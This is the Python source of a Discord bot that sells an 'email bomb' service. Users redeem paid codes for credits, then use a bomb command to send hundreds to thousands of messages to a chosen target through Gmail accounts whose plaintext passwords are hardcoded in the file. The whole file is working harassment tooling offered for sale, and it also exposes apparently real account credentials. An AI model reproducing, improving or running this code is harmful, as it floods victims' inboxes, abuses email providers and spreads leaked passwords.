
'''imports'''
import sys
from discord.ext import commands
from discord.ext.commands import has_permissions, MissingPermissions
import smtplib
import os
import discord
from collections import defaultdict
from datetime import datetime
import random
import string
import pickle
import time

bot = commands.Bot(command_prefix='*')

uses = defaultdict(int)

with (open("dict.pickle", "rb")) as openfile:
    uses = pickle.load(openfile)

def _details(emailTarget, emailFreq):

    mailAddresses = ["freefooduk@gmail.com", "mobilegameratyt@gmail.com", "bobatyourhouse6@gmail.com", "joshdrewoffer@gmail.com", "lonquehere@gmail.com", "Freeflightsuk@gmail.com", "123gamerz4eva@gmail.com", "bestnetworkuk@gmail.com"]
    mailPasswords = ["Minecraft786", "Yahyeabdulle94", "Yahyeabdulle94", "Minecraft786", "Minecraft786", "Minecraft786", "Minecraft786", "Minecraft786"]

    chooseMail = random.choice(mailAddresses)
    indexMail = mailAddresses.index(chooseMail)
    indexPass = mailPasswords[indexMail]
    
    mailTarget = emailTarget
    mailFreq = int(emailFreq*0.1)

    mailServer = 'smtp.gmail.com'
    mailPort = int(587)

    mailFromAddr = chooseMail
    mailFromPwd = indexPass
    mailSubject = "PlugStation Work"
    mailMmessage = "Enjoy"

    mailMsg = '''From: %s\nTo: %s\nSubject %s\n%s\n
    ''' % (mailFromAddr, mailTarget, mailSubject, mailMmessage)

    s = smtplib.SMTP(mailServer, mailPort)
    s.ehlo()
    s.starttls()
    s.ehlo()
    s.login(mailFromAddr, mailFromPwd)

    counter =0
    for email in range(int(mailFreq)):
        s.sendmail(mailFromAddr, mailTarget, mailMsg)
        counter += 1
        if (counter%5) == 0:
            time.sleep(10)

    s.close()

@bot.command(pass_context=True)
async def redeem(ctx, *arg):

    with open('codes1k.txt', 'r+') as cd1:
        t = cd1.read()
        to_delete = arg[0]
        cd1.seek(0)
        for line in t.split('\n'):
            if line.strip() == arg[0]:
                uses[ctx.message.author.id] += 1000
                await ctx.send(f"\n > `{ctx.message.author.name} has claimed 1000 emails`")
        cd1.truncate()
        
    with open('codes2k.txt', 'r+') as cd2:
        t = cd2.read()
        to_delete = arg[0]
        cd2.seek(0)
        for line in t.split('\n'):
            if line.strip() == arg[0]:
                uses[ctx.message.author.id] += 2500
                await ctx.send(f"\n > `{ctx.message.author.name} has claimed 2500 emails`")
        cd2.truncate()

    with open('codes3k.txt', 'r+') as cd3:
        t = cd3.read()
        to_delete = arg[0]
        cd3.seek(0)
        for line in t.split('\n'):
            if line.strip() == arg[0]:
                uses[ctx.message.author.id] += 5000
                await ctx.send(f"\n > `{ctx.message.author.name} has claimed 5000 emails`")
            else:
                None
            if line != to_delete:
                cd3.write(line + '\n')
        cd3.truncate()

    with open('codes4k.txt', 'r+') as cd4:
        t = cd4.read()
        to_delete = arg[0]
        cd4.seek(0)
        for line in t.split('\n'):
            if line.strip() == arg[0]:
                uses[ctx.message.author.id] += 10000
                await ctx.send(f"\n > `{ctx.message.author.name} has claimed 10000 emails`")
            else:
                None
            if line != to_delete:
                cd4.write(line + '\n')
        cd4.truncate()

    with open('secretkey.txt', 'r+') as cd5:
        t = cd5.readlines()
        for line in t:
            if line.strip() == arg[0]:
                uses[ctx.message.author.id] += 100000000
                await ctx.send(f"\n > `{ctx.message.author.name} has claimed the secret emails`")
            else:
                None
    pickle_out = open("dict.pickle", "wb")
    pickle.dump(uses, pickle_out)
    pickle_out.close()

@bot.command(pass_context=True)
async def balance(ctx):
    await ctx.send(f"\n > `{ctx.message.author.name}'s Balance: {uses[ctx.message.author.id]}`")

@bot.command(pass_context=True)
async def add(ctx, *arg):
    codeFile = int(arg[0])
    code = arg[1]

    guild = ctx.message.guild
    channel = guild.get_channel(676039157381857310)
    if ctx.message.channel == channel:
        if codeFile == 1:
            with open("codes1k.txt", "a") as cd1w:
                cd1w.write("\n" + code)
                await ctx.send(f"\n > `Code successfully added!`")
        elif codeFile == 2:
            with open("codes2k.txt", "a") as cd2w:
                cd2w.write("\n" + code)
                await ctx.send(f"\n > `Code successfully added!`")
        elif codeFile == 3:
            with open("codes3k.txt", "a") as cd3w:
                cd3w.write("\n" + code)
                await ctx.send(f"\n > `Code successfully added!`")
        elif codeFile == 4:
            with open("codes4k.txt", "a") as cd4w:
                cd4w.write("\n" + code)
                await ctx.send(f"\n > `Code successfully added!`")
        else:
            await ctx.send("\n > `Invalid format!`")
    #else:
       # None


@bot.command(pass_context=True)
async def bomb(ctx, *arg):
    emailTarget = arg[0]
    emailFreq = int(arg[1])
    #guild = ctx.message.guild
    #channel = guild.get_channel(675784308774010922)
    #if ctx.message.channel == channel:
    if emailFreq >= 700:
        if (uses[ctx.message.author.id]) > emailFreq:
            await ctx.send(f"\n >>> `Email bomb started, I have DM you with start and end time! \n This bomb cost {emailFreq}`")
            await ctx.author.send(f"\n > Email bomb started at {datetime.now()}")
            uses[ctx.message.author.id] -= emailFreq
            _details(emailTarget, emailFreq)
            await ctx.author.send(f"\n > Email bomb completed, finished at {datetime.now()}")
            pickle_out = open("dict.pickle", "wb")
            pickle.dump(uses, pickle_out)
            pickle_out.close
        else:
            await ctx.send(f"\n >>> `{ctx.message.author.name} \n You don't have enough credits! \n Buy more at ` <https://shoppy.gg/@plugbot>") 
    else:
        await ctx.send(f"\n >>> `{ctx.message.author.name} \n Minimum num. of emails is 700! \n Buy more at ` <https://shoppy.gg/@plugbot>")    


bot.run(os.environ['DISCORD_TOKEN'])
